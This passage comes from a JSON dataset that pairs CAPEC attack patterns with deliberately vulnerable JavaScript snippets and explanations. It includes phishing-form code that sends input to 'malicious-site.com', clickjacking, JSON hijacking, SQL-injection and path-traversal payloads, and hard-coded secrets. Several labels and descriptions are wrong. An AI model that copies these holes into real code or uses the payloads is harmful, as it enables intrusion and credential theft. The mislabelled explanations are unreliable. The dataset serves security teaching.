        "description": "This JavaScript code snippet demonstrates a scenario where an application attempts to read a configuration file using the 'fs' library. The 'readConfigFile' function checks if the file exists and reads its content. If the file is not found or an error occurs during reading, it catches the error and logs it, then falls back to a default configuration. This represents the CAPEC 'Block Access to Libraries' by showing how the application handles the situation where access to a required library (in this case, the file system) is blocked or fails. The code also touches on related CWEs: it uses a ubiquitous API (CWE-589), handles potential errors gracefully to avoid insecure states (CWE-119), and ensures that the application can continue running with a default configuration even if the library access fails (CWE-1322)."
    },
    {
        "capec_id": "97",
        "capec_name": "Cryptanalysis",
        "code_snippet": "const crypto = require('crypto');\n\n// Using a weak cryptographic algorithm (MD5)\nfunction encrypt(text) {\n  const hash = crypto.createHash('md5');\n  hash.update(text);\n  return hash.digest('hex');\n}\n\n// Weak IV generation\nfunction generateWeakIV() {\n  return '1234567890abcdef'; // Predictable IV\n}\n\n// Encrypting data with weak IV\nfunction encryptWithWeakIV(text) {\n  const iv = generateWeakIV();\n  const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from('a_secure_key_1234567890abcdef'), iv);\n  let encrypted = cipher.update(text, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\n// Example usage\nconst plaintext = 'Sensitive data';\nconsole.log('Encrypted with MD5:', encrypt(plaintext));\nconsole.log('Encrypted with weak IV:', encryptWithWeakIV(plaintext));",
        "description": "This JavaScript code snippet demonstrates the concept of cryptanalysis by using weak cryptographic practices. The `encrypt` function uses the broken MD5 algorithm (CWE-327), which is known to be vulnerable to attacks. The `generateWeakIV` function generates a predictable Initialization Vector (IV) (CWE-1204), which is not sufficiently random or unique. The `encryptWithWeakIV` function uses this weak IV in the AES-256-CBC encryption process, making the encryption vulnerable. This code exemplifies how improper application of cryptographic algorithms and weak IV generation can lead to vulnerabilities that can be exploited through cryptanalysis."
    },
    {
        "capec_id": "98",
        "capec_name": "Phishing",
        "code_snippet": "function redirectToPhishingSite() {\n    var userInput = prompt('Please enter your email to continue:');\n    var redirectUrl = 'http://malicious-site.com/login?email=' + encodeURIComponent(userInput);\n    window.location.href = redirectUrl;\n}\n\nfunction displayFakeLogin() {\n    document.body.innerHTML = '<h2>Login to Your Account</h2>' +\n                              '<form onsubmit=\"redirectToPhishingSite(); return false;\">' +\n                              'Email: <input type=\"text\" name=\"email\"><br>' +\n                              'Password: <input type=\"password\" name=\"password\"><br>' +\n                              '<input type=\"submit\" value=\"Login\">' +\n                              '</form>';\n}\n\ndisplayFakeLogin();",
        "description": "This JavaScript code snippet demonstrates a phishing attack by creating a fake login form that prompts the user to enter their email and password. When the form is submitted, the user is redirected to a malicious site with their email as a query parameter. This embodies the main idea of phishing (CAPEC) by masquerading as a legitimate login form to gather confidential information. The code also incorporates CWE-601 (URL Redirection to Untrusted Site) by redirecting the user to a malicious URL, and CWE-451 (User Interface Misrepresentation of Critical Information) by displaying a fake login form that misrepresents its true purpose."
    },
    {
        "capec_id": "99",
        "capec_name": "DEPRECATED: XML Parser Attack",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst xml2js = require('xml2js');\nconst app = express();\n\napp.use(bodyParser.text({ type: 'application/xml' }));\n\napp.post('/upload', (req, res) => {\n  const xml = req.body;\n  xml2js.parseString(xml, (err, result) => {\n    if (err) {\n      return res.status(400).send('Invalid XML');\n    }\n    // Process the XML data\n    res.send('XML processed successfully');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a basic Express.js server that accepts XML data via a POST request. The server uses the 'xml2js' library to parse the XML data. However, the code lacks proper validation and sanitization of the XML input, making it vulnerable to several XML-related attacks. Specifically, it does not neutralize special elements (CWE-91), validate the XML against a schema (CWE-112), or restrict XML external entity references (CWE-611). This can lead to XML Injection, processing of malicious XML payloads, and potential exposure to external entities, embodying the main idea of the deprecated CAPEC: XML Parser Attack."
    },
    {
        "capec_id": "100",
        "capec_name": "Overflow Buffers",
        "code_snippet": "function vulnerableFunction(input) {\n  var buffer = new Array(10);\n  for (var i = 0; i <= input.length; i++) {\n    buffer[i] = input[i];\n  }\n  console.log('Buffer content:', buffer);\n}\n\n// Example usage\nvar userInput = 'This is a very long input string that will cause a buffer overflow';\nvulnerableFunction(userInput);",
        "description": "This JavaScript code snippet demonstrates a buffer overflow vulnerability. The function `vulnerableFunction` takes an `input` string and attempts to copy its contents into a fixed-size buffer array of length 10. The loop iterates over the length of the input string, which can exceed the buffer's size, leading to a buffer overflow. This code embodies the main idea of CAPEC-1000 (Overflow Buffers) and is related to several CWEs, such as CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer). The vulnerability arises because the code does not check if the input length exceeds the buffer's capacity, allowing an attacker to overwrite memory beyond the buffer's boundaries."
    },
    {
        "capec_id": "101",
        "capec_name": "Server Side Include (SSI) Injection",
        "code_snippet": "const http = require('http');\nconst url = require('url');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const filePath = `./pages/${queryObject.page}.html`;\n\n  fs.readFile(filePath, 'utf8', (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/html'});\n      res.end('404 Not Found');\n      return;\n    }\n\n    // Vulnerable to SSI Injection\n    res.writeHead(200, {'Content-Type': 'text/html'});\n    res.end(data);\n  });\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads an HTML file based on user input from the URL query parameter 'page' and serves it to the client. The code is vulnerable to Server Side Include (SSI) Injection because it directly uses user input to construct the file path without proper validation or sanitization. An attacker could exploit this by providing a malicious 'page' parameter that includes SSI directives, leading to arbitrary code execution or information disclosure. This example also highlights related weaknesses such as improper input validation (CWE-20), improper neutralization of special elements (CWE-74), and unparsed raw web content delivery (CWE-433)."
    },
    {
        "capec_id": "102",
        "capec_name": "Session Sidejacking",
        "code_snippet": "const http = require('http');\nconst server = http.createServer((req, res) => {\n  if (req.url === '/login' && req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      const credentials = JSON.parse(body);\n      // Simulate authentication\n      if (credentials.username === 'user' && credentials.password === 'pass') {\n        const sessionToken = '123456'; // Insecure session token\n        res.setHeader('Set-Cookie', `sessionToken=${sessionToken}`);\n        res.end('Login successful');\n      } else {\n        res.end('Login failed');\n      }\n    });\n  } else {\n    res.end('Welcome');\n  }\n});\nserver.listen(8080, () => {\n  console.log('Server running on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that handles a login request. When a POST request is made to the '/login' endpoint, it processes the request body to extract credentials. If the credentials match predefined values, it sets a session token in a cookie without using secure attributes or encryption. This embodies the main idea of CAPEC-Session Sidejacking by demonstrating how an attacker could sniff the network traffic to capture the session token, as the communication is unencrypted (CWE-319). The code also highlights the use of insecure methods to transmit credentials (CWE-522, CWE-523) and the lack of secure attributes for cookies (CWE-614)."
    },
    {
        "capec_id": "103",
        "capec_name": "Clickjacking",
        "code_snippet": "<html>\n<head>\n  <style>\n    iframe {\n      position: absolute;\n      top: 0;\n      left: 0;\n      width: 100%;\n      height: 100%;\n      opacity: 0;\n      z-index: 2;\n    }\n    button {\n      position: relative;\n      z-index: 1;\n    }\n  </style>\n</head>\n<body>\n  <button onclick=\"alert('Button Clicked!')\">Click Me!</button>\n  <iframe src=\"http://malicious-site.com\"></iframe>\n</body>\n</html>",
        "description": "This JavaScript code snippet demonstrates a basic example of a clickjacking attack. The main idea is to trick the user into clicking on an element within an iframe that is controlled by an attacker, while the user believes they are interacting with a different UI element. The iframe is styled to be transparent and positioned over a legitimate button, making it invisible to the user. When the user attempts to click the button, they are actually clicking on the iframe, which could lead to unintended actions such as submitting a form or clicking a malicious link. This example embodies the CAPEC description of clickjacking and highlights CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) by not restricting the iframe from overlaying the button, leading to user confusion and potential security risks."
    },
    {
        "capec_id": "104",
        "capec_name": "Cross Zone Scripting",
        "code_snippet": "function loadContent(url) {\n    if (!url.startsWith('https://trusted.com')) {\n        alert('Untrusted source!');\n        return;\n    }\n    fetch(url)\n        .then(response => response.text())\n        .then(data => {\n            document.getElementById('content').innerHTML = data;\n        })\n        .catch(error => console.error('Error loading content:', error));\n}\n\n// Example usage\nloadContent('http://malicious.com/script.js');",
        "description": "This JavaScript code snippet demonstrates a simplified version of a Cross Zone Scripting (CAPEC-160) vulnerability. The function `loadContent` is designed to fetch and load content from a given URL into a web page element with the ID 'content'. However, it only performs a basic check to ensure the URL starts with 'https://trusted.com'. This check is insufficient and can be easily bypassed, leading to potential security issues.\n\nThe code snippet embodies several related CWEs:\n\n1. **CWE-250: Execution with Unnecessary Privileges** - The function fetches and executes content from an external source without proper privilege checks, potentially allowing malicious scripts to run with elevated privileges.\n\n2. **CWE-638: Not Using Complete Mediation** - The URL check is incomplete and does not fully mediate access to the resource, allowing untrusted content to be loaded.\n\n3. **CWE-285: Improper Authorization** - The function does not properly authorize the source of the content, leading to unauthorized content being loaded.\n\n4. **CWE-116: Improper Encoding or Escaping of Output** - The fetched content is directly inserted into the DOM without proper encoding or escaping, which can lead to cross-site scripting (XSS) attacks.\n\n5. **CWE-20: Improper Input Validation** - The URL input is not properly validated, allowing potentially dangerous URLs to be processed.\n\nOverall, this code snippet highlights the risks associated with loading external content without proper security checks, which can lead to privilege escalation and other security vulnerabilities."
    },
    {
        "capec_id": "105",
        "capec_name": "HTTP Request Splitting",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  let userInput = req.url.split('?')[1];\n  if (userInput) {\n    // Vulnerable to HTTP Request Splitting\n    res.setHeader('Set-Cookie', `sessionId=${userInput}`);\n    res.end('Cookie set');\n  } else {\n    res.end('No input provided');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js. The server processes incoming requests and extracts user input from the URL query string. It then sets this user input as a value in the 'Set-Cookie' HTTP header without proper sanitization. This lack of neutralization of special elements (such as CRLF sequences) can lead to HTTP Request Splitting vulnerabilities. An attacker could exploit this by injecting CRLF characters into the user input, causing the server to split the HTTP request into multiple unauthorized requests. This demonstrates the main idea of CAPEC-33 (HTTP Request Splitting) and is related to CWE-113 (Improper Neutralization of CRLF Sequences in HTTP Headers) and CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component)."
    },
    {
        "capec_id": "106",
        "capec_name": "DEPRECATED: XSS through Log Files",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst fs = require('fs');\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/submit', (req, res) => {\n  const userInput = req.body.input;\n  // Log user input to a file\n  fs.appendFile('server.log', `User input: ${userInput}\\n`, (err) => {\n    if (err) throw err;\n  });\n  // Reflect user input back to the user\n  res.send(`<html><body>User input: ${userInput}</body></html>`);\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that accepts user input via a POST request to the '/submit' endpoint. The user input is logged to a file named 'server.log' and then reflected back to the user in an HTML response. This code is vulnerable to Cross-Site Scripting (XSS) attacks because it does not properly neutralize user input before logging it or including it in the HTML response. An attacker could inject malicious scripts into the input, which would then be executed when the log file is viewed or when the response is rendered in a browser. This demonstrates the main idea of the deprecated CAPEC, which involves XSS through log files, and highlights related CWEs such as CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-692 (Incomplete Denylist to Cross-Site Scripting)."
    },
    {
        "capec_id": "107",
        "capec_name": "Cross Site Tracing",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  if (req.method === 'TRACE') {\n    res.writeHead(200, { 'Content-Type': 'message/http' });\n    res.end(req.headers.cookie);\n  } else {\n    res.writeHead(405, { 'Content-Type': 'text/plain' });\n    res.end('Method Not Allowed');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. If the request method is 'TRACE', the server responds with the contents of the 'cookie' header from the request. This demonstrates the Cross Site Tracing (XST) vulnerability, where an attacker can exploit the TRACE method to steal session cookies and other sensitive information. The code also includes a basic check to return a 'Method Not Allowed' response for non-TRACE requests. This example highlights the improper use of HTTP methods (CWE-693) and the potential for session hijacking through XST."
    },
    {
        "capec_id": "108",
        "capec_name": "Command Line Execution through SQL Injection",
        "code_snippet": "const express = require('express');\nconst mysql = require('mysql');\nconst { exec } = require('child_process');\nconst app = express();\nconst connection = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'test_db'\n});\n\napp.get('/execute', (req, res) => {\n  const userInput = req.query.id;\n  const query = `SELECT command FROM commands WHERE id = '${userInput}'`;\n\n  connection.query(query, (error, results) => {\n    if (error) throw error;\n    const command = results[0].command;\n    exec(command, (err, stdout, stderr) => {\n      if (err) {\n        res.send(`Error: ${stderr}`);\n        return;\n      }\n      res.send(`Output: ${stdout}`);\n    });\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a web application using Express.js and MySQL that is vulnerable to command line execution through SQL injection. The application fetches a command from a database based on user input and executes it using the `exec` function from the `child_process` module. The user input is not properly sanitized, leading to potential SQL injection (CWE-89) and OS command injection (CWE-78) vulnerabilities. An attacker can exploit this by injecting malicious SQL that retrieves harmful commands from the database, which are then executed on the server, representing the main idea of the CAPEC."
    },
    {
        "capec_id": "109",
        "capec_name": "Object Relational Mapping Injection",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst bodyParser = require('body-parser');\nconst { Sequelize, DataTypes } = require('sequelize');\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst sequelize = new Sequelize('database', 'username', 'password', {\n  host: 'localhost',\n  dialect: 'mysql'\n});\n\nconst User = sequelize.define('User', {\n  username: {\n    type: DataTypes.STRING,\n    allowNull: false\n  },\n  password: {\n    type: DataTypes.STRING,\n    allowNull: false\n  }\n});\n\napp.post('/login', async (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n\n  // Vulnerable code: using raw query with user input\n  const query = `SELECT * FROM Users WHERE username = '${username}' AND password = '${password}'`;\n  try {\n    const users = await sequelize.query(query, { type: sequelize.QueryTypes.SELECT });\n    if (users.length > 0) {\n      res.send('Login successful');\n    } else {\n      res.send('Invalid credentials');\n    }\n  } catch (error) {\n    res.status(500).send('Internal Server Error');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of a login endpoint using the Express framework and Sequelize ORM. The vulnerability arises from constructing a raw SQL query using user input without proper validation or neutralization of special elements, leading to a potential SQL Injection attack. The code captures the essence of CAPEC-306 (Object Relational Mapping Injection) and related CWEs, particularly CWE-89 (SQL Injection) and CWE-564 (SQL Injection: Hibernate). An attacker could exploit this vulnerability by injecting malicious SQL code through the 'username' or 'password' fields, potentially gaining unauthorized access to the database."
    },
    {
        "capec_id": "110",
        "capec_name": "SQL Injection through SOAP Parameter Tampering",
        "code_snippet": "const soap = require('soap');\nconst mysql = require('mysql');\n\nconst url = 'http://example.com/service?wsdl';\nconst args = { userId: '1 OR 1=1' }; // Malicious input\n\nsoap.createClient(url, function(err, client) {\n  if (err) throw err;\n  client.getUser(args, function(err, result) {\n    if (err) throw err;\n    const connection = mysql.createConnection({\n      host: 'localhost',\n      user: 'root',\n      password: 'password',\n      database: 'test'\n    });\n\n    connection.connect();\n\n    // Vulnerable SQL query\n    const query = `SELECT * FROM users WHERE id = ${result.userId}`;\n    connection.query(query, function (error, results, fields) {\n      if (error) throw error;\n      console.log(results);\n    });\n\n    connection.end();\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a SQL Injection vulnerability through SOAP parameter tampering. The SOAP client sends a request with a malicious 'userId' parameter ('1 OR 1=1') to the service provider. The service provider then constructs an SQL query using this unvalidated input, leading to a SQL Injection vulnerability. The code does not use parameter binding, making it susceptible to SQL Injection attacks. This example highlights the importance of proper input validation and neutralization to prevent such vulnerabilities."
    },
    {
        "capec_id": "111",
        "capec_name": "JSON Hijacking (aka JavaScript Hijacking)",
        "code_snippet": "/* Vulnerable JSON endpoint */\napp.get('/data', (req, res) => {\n  const data = { secret: 'confidentialData' };\n  res.json(data);\n});\n\n/* Malicious script on attacker's site */\n<script>\n  function stealData() {\n    const script = document.createElement('script');\n    script.src = 'http://victim.com/data';\n    document.body.appendChild(script);\n  }\n  stealData();\n</script>",
        "description": "The provided code snippet demonstrates a JSON Hijacking vulnerability. The server-side code exposes a JSON endpoint that returns sensitive data without proper origin validation or authentication checks (CWE-345, CWE-346). The client-side code on the attacker's site exploits this by dynamically creating a script element that points to the vulnerable endpoint. When the script is executed, the JSON data is fetched and executed in the context of the attacker's site, bypassing the Same Origin Policy. This allows the attacker to steal confidential information. The snippet also touches on related weaknesses such as CSRF (CWE-352) and improper input neutralization (CWE-79), as the server does not verify the authenticity of the request or the origin of the data."
    },
    {
        "capec_id": "112",
        "capec_name": "Brute Force",
        "code_snippet": "const users = { 'user1': 'password123', 'user2': 'password456' }; // CWE-521\n\nfunction authenticate(username, password) {\n  if (users[username] && users[username] === password) {\n    return 'Authenticated';\n  }\n  return 'Authentication Failed';\n}\n\nlet attempts = 0;\nconst MAX_ATTEMPTS = 5; // CWE-307\n\nfunction login(username, password) {\n  if (attempts >= MAX_ATTEMPTS) {\n    return 'Too many attempts. Try again later.';\n  }\n  attempts++;\n  return authenticate(username, password);\n}\n\n// Example brute force attack\nconst bruteForceAttack = () => {\n  const possiblePasswords = ['password123', 'password456', 'password789']; // CWE-330\n  for (let i = 0; i < possiblePasswords.length; i++) {\n    console.log(login('user1', possiblePasswords[i]));\n  }\n};\n\nbruteForceAttack();",
        "description": "This JavaScript code snippet demonstrates a simple authentication system vulnerable to brute force attacks. The 'users' object stores usernames and weak passwords (CWE-521). The 'authenticate' function checks if the provided username and password match. The 'login' function limits the number of authentication attempts to 5 (CWE-307). The 'bruteForceAttack' function simulates a brute force attack by trying a list of possible passwords (CWE-330). This code highlights the vulnerabilities associated with weak password requirements, insufficiently random values, and improper restriction of excessive authentication attempts, making it susceptible to brute force attacks."
    },
    {
        "capec_id": "113",
        "capec_name": "Interface Manipulation",
        "code_snippet": "const fs = require('fs');\nconst path = '/sys/class/gpio/gpio23/value';\n\n// Improper access control to hardware register\nfs.writeFile(path, '1', (err) => {\n  if (err) {\n    console.error('Failed to write to GPIO register:', err);\n  } else {\n    console.log('GPIO register manipulated successfully');\n  }\n});\n\n// Exposed IOCTL with insufficient access control\nconst ioctl = require('ioctl');\nconst fd = fs.openSync('/dev/someDevice', 'r+');\nconst command = 0x1234; // Hypothetical IOCTL command\nconst arg = Buffer.alloc(4);\nioctl(fd, command, arg, (err) => {\n  if (err) {\n    console.error('Failed to execute IOCTL command:', err);\n  } else {\n    console.log('IOCTL command executed successfully');\n  }\n});\n\n// Hardware allows activation of debug logic at runtime\nconst debugPath = '/sys/kernel/debug/some_debug_interface';\nfs.writeFile(debugPath, 'enable', (err) => {\n  if (err) {\n    console.error('Failed to enable debug interface:', err);\n  } else {\n    console.log('Debug interface enabled');\n  }\n});",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to interface manipulation in a system. The first part of the code shows improper access control to a hardware register by writing directly to a GPIO value file, which could allow unauthorized manipulation of hardware state. The second part demonstrates an exposed IOCTL command with insufficient access control, allowing potentially restricted operations to be executed. The third part shows the activation of debug logic at runtime, which could be exploited to alter the system's behavior or leak sensitive data. These examples embody the main idea of CAPEC-225 by illustrating how an adversary can manipulate interfaces to compromise system security."
    },
    {
        "capec_id": "114",
        "capec_name": "Authentication Abuse",
        "code_snippet": "const users = { 'admin': 'password123' }; // CWE-287: Improper Authentication\n\nfunction authenticate(username, password) {\n  if (users[username] && users[username] === password) {\n    return true;\n  }\n  return false;\n}\n\n// CWE-307: Improper Restriction of Excessive Authentication Attempts\nlet loginAttempts = 0;\nfunction login(username, password) {\n  if (loginAttempts >= 5) {\n    console.log('Too many failed attempts. Try again later.');\n    return false;\n  }\n  if (authenticate(username, password)) {\n    console.log('Login successful!');\n    loginAttempts = 0;\n    return true;\n  } else {\n    loginAttempts++;\n    console.log('Login failed.');\n    return false;\n  }\n}\n\n// CWE-305: Authentication Bypass by Primary Weakness\nfunction bypassAuthentication() {\n  console.log('Authentication bypassed!');\n  return true;\n}\n\n// Example usage\nlogin('admin', 'wrongpassword'); // Failed attempt\nlogin('admin', 'wrongpassword'); // Failed attempt\nlogin('admin', 'wrongpassword'); // Failed attempt\nlogin('admin', 'wrongpassword'); // Failed attempt\nlogin('admin', 'wrongpassword'); // Failed attempt\nlogin('admin', 'password123'); // Should be blocked due to too many attempts\nbypassAuthentication(); // Bypasses authentication",
        "description": "This JavaScript code snippet demonstrates several common authentication vulnerabilities. The `authenticate` function checks if the provided username and password match a hardcoded user (CWE-287: Improper Authentication). The `login` function tracks login attempts but does not implement a proper lockout mechanism after multiple failed attempts (CWE-307: Improper Restriction of Excessive Authentication Attempts). Additionally, the `bypassAuthentication` function represents a scenario where an attacker can bypass the authentication mechanism entirely (CWE-305: Authentication Bypass by Primary Weakness). This code illustrates how an attacker might exploit weaknesses in authentication mechanisms to gain unauthorized access."
    },
    {
        "capec_id": "115",
        "capec_name": "Authentication Bypass",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Mock user data\nconst users = [{ username: 'admin', password: 'password123' }];\n\n// Middleware to check authentication\napp.use((req, res, next) => {\n  const { username, password } = req.query;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (user) {\n    req.user = user;\n    next();\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\n// Vulnerable route that bypasses authentication\napp.get('/admin', (req, res) => {\n  if (req.query.bypass === 'true') {\n    res.send('Access granted to admin panel without authentication');\n  } else if (req.user) {\n    res.send('Access granted to admin panel');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n",
        "description": "This JavaScript code snippet demonstrates an authentication bypass vulnerability in an Express.js application. The middleware checks for valid user credentials in the query parameters and grants access if they match. However, the '/admin' route contains a bypass mechanism that allows access to the admin panel if the 'bypass' query parameter is set to 'true', regardless of authentication. This represents the CAPEC 'Authentication Bypass' by allowing an attacker to circumvent the authentication mechanism. The related CWEs are illustrated by improper authentication checks (CWE-287), assumed-immutable data (CWE-302), and an alternate path that bypasses authentication (CWE-288)."
    },
    {
        "capec_id": "116",
        "capec_name": "Excavation",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-426: Untrusted Search Path\nconst userProvidedPath = process.argv[2];\nconst sensitiveFilePath = path.join(userProvidedPath, 'sensitive_info.txt');\n\n// CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nfs.readFile(sensitiveFilePath, 'utf8', (err, data) => {\n  if (err) {\n    console.error('Error reading file:', err);\n    return;\n  }\n  console.log('Sensitive Information:', data);\n});\n\n// CWE-1243: Sensitive Non-Volatile Information Not Protected During Debug\nif (process.env.DEBUG) {\n  console.log('Debug Mode: Sensitive information access is not restricted.');\n  console.log('Sensitive Information:', data);\n}\n\n// CWE-509: Replicating Malicious Code (Virus or Worm)\nconst maliciousCode = `\nconst fs = require('fs');\nfs.writeFile('malicious.txt', 'This is a virus!', (err) => {\n  if (err) throw err;\n  console.log('Malicious file created!');\n});\n`;\nfs.writeFile('virus.js', maliciousCode, (err) => {\n  if (err) throw err;\n  console.log('Virus file created!');\n});\n\n// CWE-1229: Creation of Emergent Resource\nconst emergentResource = 'emergent_resource.txt';\nfs.writeFile(emergentResource, 'This is an emergent resource.', (err) => {\n  if (err) throw err;\n  console.log('Emergent resource created!');\n});",
        "description": "This JavaScript code snippet demonstrates the concept of 'Excavation' by actively probing a target system to solicit sensitive information. The code includes several vulnerabilities: \n1. CWE-426: It uses an untrusted search path provided by the user to locate a sensitive file.\n2. CWE-200: It reads and exposes sensitive information from the file to unauthorized actors.\n3. CWE-1243: It does not protect sensitive information during debug mode, allowing unrestricted access.\n4. CWE-509: It replicates malicious code by creating a virus file.\n5. CWE-1229: It creates an emergent resource that could be exploited by attackers. \nOverall, the code illustrates how an adversary might probe a system to gather sensitive information and leverage it for malicious purposes."
    },
    {
        "capec_id": "117",
        "capec_name": "Interception",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'example.com',\n  port: 80,\n  path: '/login',\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/x-www-form-urlencoded'\n  }\n};\n\nconst req = http.request(options, (res) => {\n  let data = '';\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n  res.on('end', () => {\n    console.log('Response:', data);\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(`Problem with request: ${e.message}`);\n});\n\n// Sending sensitive information in cleartext\nconst postData = 'username=admin&password=secret';\nreq.write(postData);\nreq.end();",
        "description": "This JavaScript code snippet demonstrates a basic HTTP POST request to a server, sending sensitive information (username and password) in cleartext. The code uses the 'http' module to create a request to 'example.com' on port 80, which is an unencrypted channel. This embodies the main idea of CAPEC-157 (Interception) by illustrating how an adversary could intercept sensitive information transmitted in cleartext. The code also touches on CWE-319 (Cleartext Transmission of Sensitive Information) by showing the transmission of sensitive data without encryption, making it vulnerable to sniffing attacks."
    },
    {
        "capec_id": "120",
        "capec_name": "Double Encoding",
        "code_snippet": "function isValidInput(input) {\n  // Incomplete list of disallowed inputs\n  const disallowed = ['<script>', '%3Cscript%3E'];\n  // Validate before filtering\n  if (input.includes('..') || input.includes('%2E%2E')) {\n    return false;\n  }\n  // Permissive list of allowed inputs\n  const allowed = ['a', 'b', 'c'];\n  if (allowed.includes(input)) {\n    return true;\n  }\n  // Improper handling of URL encoding\n  const decodedInput = decodeURIComponent(input);\n  // Incorrect comparison\n  if (disallowed.some(item => decodedInput.includes(item))) {\n    return false;\n  }\n  return true;\n}\n\n// Example usage\nconst userInput = '%252E%252E%252F%252E%252E%252Fetc%252Fpasswd';\nconsole.log(isValidInput(userInput)); // Expected to be false, but may return true due to double encoding",
        "description": "This JavaScript code snippet demonstrates a function `isValidInput` that attempts to validate user input. The function embodies the main idea of CAPEC-170 (Double Encoding) by showing how double encoding can bypass filters. The code includes several related CWEs: it has an incomplete list of disallowed inputs (CWE-184), validates before filtering (CWE-181), uses a permissive list of allowed inputs (CWE-183), improperly handles URL encoding (CWE-177), and performs incorrect comparisons (CWE-697). The example usage shows how a doubly encoded input (`%252E%252E%252F%252E%252E%252Fetc%252Fpasswd`) might bypass the validation checks, illustrating the vulnerability."
    },
    {
        "capec_id": "121",
        "capec_name": "Exploit Non-Production Interfaces",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Debug mode flag\nconst debugMode = true;\n\n// Sample debug endpoint\nif (debugMode) {\n  app.get('/debug-info', (req, res) => {\n    // Exposing sensitive information for debugging purposes\n    res.send({\n      secretKey: '12345-ABCDE',\n      dbConnectionString: 'mongodb://user:password@localhost:27017/dbname',\n      debugData: 'Sensitive debug information'\n    });\n  });\n}\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a common vulnerability where a debug interface is unintentionally left enabled in a production environment. The code uses the Express framework to create a web server with a debug endpoint (`/debug-info`) that exposes sensitive information such as a secret key, database connection string, and other debug data. This embodies the main idea of CAPEC-489 (Exploit Non-Production Interfaces) and related CWEs like CWE-489 (Active Debug Code) and CWE-1295 (Debug Messages Revealing Unnecessary Information). An adversary could exploit this endpoint to gain unauthorized access to sensitive information."
    },
    {
        "capec_id": "122",
        "capec_name": "Privilege Abuse",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Mock user data\nconst users = [\n  { id: 1, username: 'admin', role: 'admin' },\n  { id: 2, username: 'user', role: 'user' }\n];\n\n// Mock sensitive data\nconst sensitiveData = 'This is sensitive data only for admins.';\n\n// Middleware to check if user is authenticated\nfunction isAuthenticated(req, res, next) {\n  const userId = req.headers['user-id'];\n  req.user = users.find(user => user.id == userId);\n  if (req.user) {\n    next();\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n}\n\n// Route to access sensitive data\napp.get('/sensitive', isAuthenticated, (req, res) => {\n  // Improper access control: sensitive data exposed to non-admin users\n  res.send(sensitiveData);\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server with a route that exposes sensitive data. The 'isAuthenticated' middleware checks if a user is authenticated based on a 'user-id' header but does not verify the user's role. This leads to improper access control (CWE-284) and improper privilege management (CWE-269), as non-admin users can access sensitive data meant only for admins. The code demonstrates the main idea of the CAPEC by showing how features meant for privileged users can be exploited by lower-privileged users due to insufficient access control checks."
    },
    {
        "capec_id": "123",
        "capec_name": "Buffer Manipulation",
        "code_snippet": "function vulnerableFunction(input) {\n  var buffer = new Array(10).fill(0);\n  for (var i = 0; i <= input.length; i++) {\n    buffer[i] = input.charCodeAt(i);\n  }\n  return buffer;\n}\n\n// Example usage\nvar userInput = 'A very long string that exceeds buffer size';\nconsole.log(vulnerableFunction(userInput));",
